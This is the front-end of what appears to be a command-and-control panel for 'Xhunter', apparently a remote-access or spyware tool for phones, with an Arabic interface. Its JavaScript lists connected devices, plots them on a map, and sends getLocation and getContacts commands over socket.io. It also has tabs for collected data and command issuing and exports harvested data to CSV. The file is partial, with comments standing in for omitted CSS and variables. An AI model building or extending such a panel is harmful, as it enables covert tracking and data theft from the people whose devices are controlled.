<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>نظام Xhunter المتطور - لوحة تحكم استخبارات كاملة</title>

<!-- Leaflet for map -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>

<!-- Font Awesome for icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
/* ... جميع أنماط CSS الموجودة لديك بدون أي تعديل ... */
</style>
</head>

<body>
<div class="container">
  <!-- Header -->
  <header>
    <div class="logo">
      <h1>نظام <span>Xhunter المتطور</span></h1>
    </div>
    <div class="user-info">
      <div class="user-avatar"><i class="fas fa-user-shield"></i></div>
      <div>مدير النظام</div>
      <div class="connection-status connecting" id="connectionStatus">
        <i class="fas fa-sync-alt fa-spin"></i> جاري الاتصال...
      </div>
    </div>
  </header>
  
  <!-- Sidebar -->
  <aside class="sidebar">
    <ul class="sidebar-menu">
      <li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة المتصلة</a></li>
      <li><a href="#" data-tab="map"><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</a></li>
      <li><a href="#" data-tab="data"><i class="fas fa-database"></i> البيانات المجمعة</a></li>
      <li><a href="#" data-tab="logs"><i class="fas fa-clipboard-list"></i> سجل الأحداث</a></li>
      <li><a href="#" data-tab="commands"><i class="fas fa-terminal"></i> إصدار الأوامر</a></li>
      <li><a href="#" data-tab="osint"><i class="fas fa-search"></i> جمع المعلومات</a></li>
      <li><a href="#" data-tab="analysis"><i class="fas fa-chart-line"></i> التحليلات</a></li>
      <li><a href="#"><i class="fas fa-cog"></i> الإعدادات</a></li>
      <li><a href="#"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</a></li>
    </ul>
  </aside>
  
  <!-- Main Content -->
  <main class="main-content">
    <!-- جميع الأقسام كما أرسلتها سابقاً ... -->
  </main>
  
  <!-- Footer -->
  <footer>
    <p>نظام Xhunter المتطور للإستخبارات المفتوحة - الإصدار 2.1 | &copy; 2023</p>
  </footer>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
// جميع المتغيرات والدوال كما في كودك السابق ...

// إصلاح تحديث قائمة الأجهزة على الخريطة
function updateMapDevicesList() {
  const devicesList = document.getElementById('map-devices-list');
  devicesList.innerHTML = '';
  
  const deviceIds = Object.keys(markers);
  document.getElementById('map-devices-count').textContent = deviceIds.length;
  
  if (deviceIds.length === 0) {
    devicesList.innerHTML = '<tr><td colspan="4" style="text-align: center;">لا توجد أجهزة على الخريطة</td></tr>';
    return;
  }
  
  deviceIds.forEach(deviceId => {
    const marker = markers[deviceId];
    const popupContent = marker.getPopup() ? marker.getPopup().getContent() : '';
    const addressMatch = popupContent.match(/<br>(.*)/);
    const address = addressMatch ? addressMatch[1] : '';
    const model = devicesMap[deviceId]?.model || 'غير معروف';
    
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${deviceId}</td>
      <td>${model}</td>
      <td>${address}</td>
      <td>متصل</td>
    `;
    devicesList.appendChild(row);
  });
}

// Render device in devices panel
function renderDevice(device) {
  if (!device || !device.id) return;
  if (devicesMap[device.id]) return; // Already rendered
  devicesMap[device.id] = device;
  
  const card = document.createElement('div');
  card.className = 'device-card';
  card.id = `device_${device.id}`;
  
  card.innerHTML = `
    <div class="device-header">
      <span class="device-id">${device.id}</span>
      <span class="device-status">متصل</span>
    </div>
    <div class="device-body">
      <div class="device-info">
        <div><i class="fas fa-mobile-alt"></i> ${device.model || 'غير معروف'}</div>
        <div><i class="fas fa-clock"></i> آخر نشاط: ${device.lastSeen || 'غير معروف'}</div>
      </div>
      <div class="device-extra" id="extra_${device.id}"></div>
      <div class="device-actions">
        <button class="btn btn-primary" onclick="sendCommandToDevice('${device.id}', 'getLocation')"><i class="fas fa-map-marker-alt"></i> موقع</button>
        <button class="btn btn-secondary" onclick="sendCommandToDevice('${device.id}', 'getContacts')"><i class="fas fa-address-book"></i> جهات الاتصال</button>
      </div>
    </div>
  `;
  devicesDiv.appendChild(card);
  
  // Add to select
  const option = document.createElement('option');
  option.value = device.id;
  option.textContent = device.id;
  deviceSelect.appendChild(option);
  
  updateDevicesCount();
}

// Update devices count
function updateDevicesCount() {
  const count = Object.keys(devicesMap).length;
  devicesCountEl.textContent = count;
  activeDevicesEl.textContent = count;
  locatedDevicesEl.textContent = Object.values(devicesMap).filter(d => d.lastLocation).length;
  dataPointsEl.textContent = count; // تبسيط
  noDevicesMessage.style.display = count === 0 ? 'block' : 'none';
}

// Send command to device
function sendCommandToDevice(deviceId, action) {
  if (!socket || !socket.connected) return;
  socket.emit('sendCommand', { to: deviceId, action });
  addLog(`تم إرسال الأمر "${action}" إلى الجهاز ${deviceId}`, 'info');
}

// Add log
function addLog(message, type = 'info') {
  const logEntry = document.createElement('div');
  logEntry.className = 'log-entry';
  const time = new Date().toLocaleTimeString();
  logEntry.innerHTML = `
    <span class="log-time">${time}</span>
    <span class="log-message">${message}</span>
    <i class="fas fa-info-circle log-icon"></i>
  `;
  logsDiv.prepend(logEntry);
}

// Export CSV
function exportToCsv(filename, rows) {
  if (!rows || rows.length === 0) return;
  const csvContent = [
    Object.keys(rows[0]).join(','),
    ...rows.map(r => Object.values(r).map(v => `"${v}"`).join(','))
  ].join('\n');
  const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
}
</script>
</body>
</html>
